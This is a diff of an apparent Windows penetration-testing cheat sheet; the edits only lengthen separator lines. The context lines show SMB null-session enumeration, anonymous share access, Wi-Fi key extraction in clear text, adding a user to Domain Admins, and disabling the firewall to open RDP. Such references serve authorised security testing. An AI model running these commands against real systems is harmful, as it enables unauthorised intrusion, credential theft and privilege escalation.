@@ -4,7 +4,7 @@ Windows
 # Anonymous users can obtain the Windows password policy
 
 msf > use auxiliary/scanner/smb/smb_enumusers 
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # CIFS NULL Session Permitted
 
@@ -24,13 +24,13 @@ querydominfo
 getdompwinfo
 
 net use \\target IP\ipc$ "" /u:""
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # CIFS Share Writeable By Everyone
 
 Places > Network > Browse Network
 
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Connect anonymously
 
@@ -40,7 +40,7 @@ smbclient -N -L <target IP>
 
 smbclient -W domain -U user -L <target IP>
 proxychains smbclient '//10.0.0.10/c$' -U 'domain.local/username%password'
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # NetBIOS and SMB
 
@@ -58,7 +58,7 @@ nbtscan -f hosts.txt
 smbclient //<target IP>/<share>
    dir
    get <filename>
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Enumeration using a low level account
 
@@ -106,7 +106,7 @@ dir /s /b *.pptx | findstr /E ".pptx"             Show PowerPoint files
 dir /s /b *.doc | findstr /E ".doc"               Show Word docs
 dir /s /b *.docx | findstr /E ".docx"             Show Word docs
 dir /s /b *.pdf | findstr /E ".pdf"               Show PDF files
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Firewall
 
@@ -122,7 +122,7 @@ netsh wlan show networks
 netsh wlan show profiles
 netsh wlan show profiles name="name"
 show profiles name="name" key=clear
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # User Accounts
 
@@ -153,7 +153,7 @@ net localgroup /domain                            Domain Security Groups
 
 net user <user> <password> /add /domain           Add a user to the domain
 net group "Domain Admins" <user> /add /domain     Add a user to a specific Security Group on the domain
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Open RDP in the firewall, start the service and login
 
@@ -161,7 +161,7 @@ reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v
 netsh firewall set opmode disable
 sc config termservice start= auto
 rdesktop -u <user> <target IP>
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Privilege Escalation
 
@@ -170,10 +170,10 @@ cd Windows-Exploit-Suggester
 pip install xlrd --upgrade
 ./windows-exploit-suggester.py --update (note the database file name)
 
-systeminfo.exe > systeminfo.txt               Run this on the Windows target and d/l to attack VM
+systeminfo.exe > systeminfo.txt                   Run this on the Windows target and d/l to attack VM
 
 ./windows-exploit-suggester.py --database 2020-01-18-mssb.xls --systeminfo systeminfo.txt
-------------------------------------------------------------------------------------------------------
+------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Show domain users and group information
 
